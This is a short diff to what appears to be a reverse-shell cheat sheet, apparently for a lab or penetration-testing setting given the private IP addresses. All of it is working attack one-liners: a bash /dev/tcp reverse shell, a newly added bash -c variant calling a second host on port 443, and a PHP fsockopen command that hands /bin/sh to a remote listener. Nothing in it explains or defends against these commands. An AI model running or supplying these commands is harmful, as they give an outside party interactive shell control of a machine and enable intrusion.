@@ -1,5 +1,6 @@
 [+ BASH]
 bash -i >& /dev/tcp/192.168.49.183/443 0>&1
+bash -c 'bash -i >& /dev/tcp/192.168.45.210/443 0>&1'
 
 [+ PHP]
 php -r '$sock=fsockopen("192.168.49.183",443);exec("/bin/sh -i <&3 >&3 2>&3");'
